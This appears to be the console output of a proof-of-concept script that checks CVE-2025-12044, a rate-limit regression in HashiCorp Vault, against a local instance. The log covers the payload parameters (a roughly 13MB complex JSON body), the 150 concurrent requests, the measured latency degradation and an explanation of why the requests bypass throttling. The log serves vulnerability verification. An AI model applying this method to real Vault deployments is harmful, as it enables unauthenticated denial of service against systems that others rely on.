======================================================================
CVE-2025-12044: HashiCorp Vault Rate Limit Regression DoS
======================================================================

[1] Checking target...
    Target: http://localhost:8200
    Version: 1.20.4

[2] Enabling audit device...
    Audit device: ENABLED

[3] Measuring baseline...
    Baseline response time: 1.53ms

[4] Building payload (width=3000, string_len=150)...
    Payload size: 13200KB (12.89MB)

[5] Testing single request processing time...
    Single request time: 2.164s (Status: 403)

[6] Launching concurrent attack (30 workers x 5 = 150)...
    [0/150] Health check: 36.8ms (+2312%)
    [0/150] Health check: 61.0ms (+3896%)
    [0/150] Health check: 46.5ms (+2946%)
    [0/150] Health check: 15.5ms (+915%)
    [5/150] Health check: 20.8ms (+1260%)
    [16/150] Health check: 55.6ms (+3539%)
    [30/150] Health check: 40.0ms (+2517%)
    [30/150] Health check: 26.1ms (+1610%)
    [30/150] Health check: 36.2ms (+2269%)
    [31/150] Health check: 34.2ms (+2142%)
    [44/150] Health check: 37.5ms (+2355%)
    [55/150] Health check: 26.0ms (+1604%)
    [60/150] Health check: 48.4ms (+3068%)
    [60/150] Health check: 36.3ms (+2275%)
    [60/150] Health check: 44.5ms (+2815%)
    [68/150] Health check: 23.5ms (+1439%)
    [80/150] Health check: 31.1ms (+1937%)
    [88/150] Health check: 29.1ms (+1805%)
    [90/150] Health check: 42.3ms (+2670%)
    [90/150] Health check: 54.8ms (+3488%)
    [91/150] Health check: 43.2ms (+2730%)
    [104/150] Health check: 37.6ms (+2359%)
    [115/150] Health check: 54.9ms (+3493%)
    [120/150] Health check: 30.8ms (+1919%)
    [120/150] Health check: 18.9ms (+1136%)
    [121/150] Health check: 46.9ms (+2968%)
    [130/150] Health check: 33.5ms (+2095%)
    [150/150] Health check: 4.6ms (+204%)

[7] Attack completed in 87.38s

[8] Measuring post-attack response time...
    Post-attack: 4.38ms (+187.1%)

======================================================================
RESULTS:
    Requests sent:       150
    Completed:           150
    Timeouts:            0
    Errors:              0
    Slow (>2s):          150 (100%)
    Avg request time:    16.976s
    Max request time:    21.510s
    Baseline RT:         1.53ms
    Post-attack RT:      4.38ms
    RT degradation:      +187.1%
    Degraded checks:     28
======================================================================

[+] VULNERABLE - CVE-2025-12044 CONFIRMED

Evidence:
  - Majority slow responses: 150/150
  - High avg request time: 16.98s
  - Sustained service degradation during attack
  - Post-attack degradation: 187%

Analysis:
  Complex JSON payloads consume significant server resources during parsing.
  Due to rate limit regression, these requests bypass throttling and
  directly impact service availability. Combined with mandatory audit
  logging, this enables effective unauthenticated DoS attacks.

